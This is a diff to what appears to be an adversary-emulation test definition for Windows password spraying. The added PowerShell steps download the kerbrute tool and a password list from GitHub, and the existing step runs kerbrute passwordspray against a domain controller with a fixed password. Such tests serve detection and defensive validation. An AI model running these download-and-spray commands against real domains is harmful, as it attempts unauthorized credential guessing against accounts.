@@ -21,6 +21,20 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads
+      inline: |
+        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
+        }}
+      executor: powershell
+    - name: |
+        passwordspray.txt must exist in PathToAtomicsFolder\..\ExternalPayloads
+      inline: |
+        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"
+        }}
+      executor: powershell
     - name: password-spray-using-kerbrute-tool
       inline: "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc {{.Args.domaincontroller}} -d {{.Args.domain}} \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n"
       executor: powershell
